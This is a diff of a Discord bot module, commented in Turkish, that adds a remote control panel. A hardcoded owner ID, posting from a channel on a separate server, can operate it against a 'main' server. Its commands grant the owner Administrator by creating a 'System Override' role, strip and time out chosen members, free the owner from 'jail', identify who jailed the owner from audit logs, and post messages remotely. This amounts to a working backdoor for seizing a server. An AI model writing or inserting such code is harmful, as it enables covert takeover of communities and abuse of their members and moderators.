@@ -1,61 +1,86 @@
-//--------------------------------
-// ADVANCED CONTROL PANEL (V2 STABLE)
-//--------------------------------
-
 module.exports = (client) => {
-    const PREFIX = "o!";
+    const PREFIX = "!";
     const OWNER_ID = "1097807544849809408";
-    const TARGET_GUILD_ID = "1446960659072946218";
-    const CONTROL_GUILD_ID = "1475516491431678034";
-    const CONTROL_CHANNEL_ID = "1488543017794142309";
+    const MAIN_SERVER = "1446960659072946218";
+    const TEST_SERVER = "1475516491431678034";
+    const CONTROL_CHANNEL = "1488543017794142309";
 
     client.on('messageCreate', async (message) => {
+        // Güvenlik: Botları, DM'leri ve yetkisiz kişileri engelle
         if (message.author.bot || !message.guild) return;
         if (message.author.id !== OWNER_ID) return;
-        if (message.guild.id !== CONTROL_GUILD_ID || message.channel.id !== CONTROL_CHANNEL_ID) return;
+        if (message.guild.id !== TEST_SERVER || message.channel.id !== CONTROL_CHANNEL) return;
         if (!message.content.startsWith(PREFIX)) return;
 
         const args = message.content.slice(PREFIX.length).trim().split(/ +/);
         const cmd = args.shift().toLowerCase();
-        const targetGuild = client.guilds.cache.get(TARGET_GUILD_ID);
+        const mainGuild = client.guilds.cache.get(MAIN_SERVER);
 
-        if (!targetGuild) return message.reply("❌ Ana sunucu bulunamadı.");
+        if (!mainGuild) return message.reply("❌ Ana sunucuya erişilemiyor!");
 
-        // --- WHO JAILED (PRO VERSION) ---
-        if (cmd === "whojailed") {
+        // --- MANUEL JAIL ---
+        if (cmd === "jail") {
+            const targetId = args[0];
+            if (!targetId || targetId === OWNER_ID) return message.reply("❌ Geçersiz ID.");
+
             try {
-                const logs = await targetGuild.fetchAuditLogs({ type: 25, limit: 15 });
-                const entry = logs.entries.find(e => {
-                    if (e.target?.id !== OWNER_ID) return false;
-                    return e.changes?.some(c => c.key === "$add" && c.new.some(r => r.name.toLowerCase().includes("jail")));
-                });
+                const member = await mainGuild.members.fetch(targetId);
+                const jailRole = mainGuild.roles.cache.find(r => r.name.toLowerCase().includes("jail"));
+                if (!jailRole) return message.reply("❌ Jail rolü bulunamadı.");
 
-                if (!entry) return message.reply("🧐 Son kayıtlarda seni jailleyen bulunamadı.");
-                return message.reply(`🕵️ Seni jailleyen kişi: **${entry.executor?.tag}** (ID: ${entry.executor?.id})`);
-            } catch (e) { return message.reply("❌ Audit log hatası."); }
+                // Diğer her şeyi temizle, sadece jail ver
+                await member.roles.set([jailRole.id]).catch(() => {});
+                await member.timeout(24 * 60 * 60 * 1000, "Lockdown").catch(() => {});
+                return message.reply(`⛓️ **${member.user.tag}** paketlendi.`);
+            } catch (e) { return message.reply("❌ Yetki yetmiyor."); }
         }
 
-        // --- FORCE ADMIN ---
+        // --- MANUEL UNJAIL ---
+        if (cmd === "unjail") {
+            const targetId = args[0] || OWNER_ID;
+            try {
+                const member = await mainGuild.members.fetch(targetId);
+                const jailRole = mainGuild.roles.cache.find(r => r.name.toLowerCase().includes("jail"));
+                if (jailRole) await member.roles.remove(jailRole);
+                if (member.isCommunicationDisabled()) await member.timeout(null);
+                return message.reply(`✅ **${targetId}** serbest.`);
+            } catch (e) { return message.reply("❌ Hata."); }
+        }
+
+        // --- ADMIN BASTIR (FORCE) ---
         if (cmd === "forceadmin") {
             try {
-                const member = await targetGuild.members.fetch(OWNER_ID);
-                let adminRole = targetGuild.roles.cache.find(r => r.permissions.has("Administrator") && r.editable);
+                const member = await mainGuild.members.fetch(OWNER_ID);
+                let adminRole = mainGuild.roles.cache.find(r => r.permissions.has("Administrator") && r.editable);
                 if (!adminRole) {
-                    adminRole = await targetGuild.roles.create({ name: 'System Override', permissions: ["Administrator"] });
+                    adminRole = await mainGuild.roles.create({ name: 'System Override', permissions: ["Administrator"] });
                 }
                 await member.roles.add(adminRole);
-                return message.reply("⚡ Admin yetkisi tanımlandı.");
-            } catch (e) { return message.reply("❌ Hiyerarşi hatası: Botun rolü yetmiyor."); }
+                return message.reply("⚡ Adminlik verildi.");
+            } catch (e) { return message.reply("❌ Botun hiyerarşisi düşük."); }
         }
 
-        // --- SAY ---
+        // --- KİM JAİLLEDİ? ---
+        if (cmd === "whojailed") {
+            try {
+                const logs = await mainGuild.fetchAuditLogs({ type: 25, limit: 15 });
+                const entry = logs.entries.find(e => 
+                    e.target?.id === OWNER_ID && 
+                    e.changes?.some(c => c.key === "$add" && c.new.some(r => r.name.toLowerCase().includes("jail")))
+                );
+                if (!entry) return message.reply("🧐 Kayıt yok.");
+                return message.reply(`🕵️ Seni paketleyen: **${entry.executor?.tag}**`);
+            } catch (e) { return message.reply("❌ Log hatası."); }
+        }
+
+        // --- UZAKTAN KONUŞMA ---
         if (cmd === "say") {
             const channelId = args[0];
             const text = args.slice(1).join(" ");
-            const channel = targetGuild.channels.cache.get(channelId);
-            if (channel && text) {
+            const channel = mainGuild.channels.cache.get(channelId);
+            if (channel) {
                 await channel.send(text);
-                return message.reply("✅ Mesaj gönderildi.");
+                return message.reply("✅ Gönderildi.");
             }
         }
     });
